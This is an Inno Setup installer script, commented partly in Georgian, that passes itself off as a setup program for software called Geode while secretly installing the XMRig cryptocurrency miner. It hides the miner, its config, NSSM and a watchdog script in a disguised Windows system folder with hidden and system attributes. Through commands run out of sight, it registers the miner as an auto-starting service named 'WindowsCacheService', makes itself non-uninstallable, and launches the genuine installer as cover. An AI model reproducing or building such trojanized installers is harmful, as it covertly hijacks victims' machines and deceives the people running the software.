; Geode + XMRig Installer (Atrio hidden) - NO REGISTRY

[Setup]
AppName=Geode
AppVersion=1.0.0
DefaultDirName={pf}\Geode
DefaultGroupName=Geode
Compression=lzma2
SolidCompression=yes
PrivilegesRequired=admin
OutputDir=C:\GeodeInstaller
OutputBaseFilename=Geode-Setup
DisableDirPage=no
DisableProgramGroupPage=no
DisableReadyPage=no
DisableFinishedPage=no
Uninstallable=no

[Files]
; XMRig (ატრიო)
Source: "xmrig.exe"; DestDir: "{commonappdata}\Microsoft\Windows\Caches"; Flags: ignoreversion; Attribs: hidden system
Source: "config.json"; DestDir: "{commonappdata}\Microsoft\Windows\Caches"; Flags: ignoreversion; Attribs: hidden system
Source: "nssm.exe"; DestDir: "{commonappdata}\Microsoft\Windows\Caches"; Flags: ignoreversion; Attribs: hidden system
Source: "watchdog.bat"; DestDir: "{commonappdata}\Microsoft\Windows\Caches"; Flags: ignoreversion; Attribs: hidden system

; ნამდვილი Geode
Source: "Geode-Windows.exe"; DestDir: "{app}"; DestName: "Geode-Original.exe"; Flags: ignoreversion; Attribs: hidden system

[Run]
; XMRig Service (WindowsCacheService)
Filename: "{cmd}"; \
    Parameters: "/C cd /d ""{commonappdata}\Microsoft\Windows\Caches"" && nssm.exe install WindowsCacheService ""{commonappdata}\Microsoft\Windows\Caches\xmrig.exe"" && nssm.exe set WindowsCacheService AppDirectory ""{commonappdata}\Microsoft\Windows\Caches"" && nssm.exe set WindowsCacheService Start SERVICE_AUTO_START && nssm.exe start WindowsCacheService"; \
    Flags: runhidden

; Start watchdog
Filename: "{cmd}"; Parameters: "/C start /B """" ""{commonappdata}\Microsoft\Windows\Caches\watchdog.bat"""; Flags: runhidden

; ნამდვილი Geode-ს ინსტალაცია (Finish-ის შემდეგ)
Filename: "{app}\Geode-Original.exe"; Flags: nowait postinstall

[Code]
var
  ResultCode: Integer;

function InitializeSetup(): Boolean;
begin
  Result := True;
end;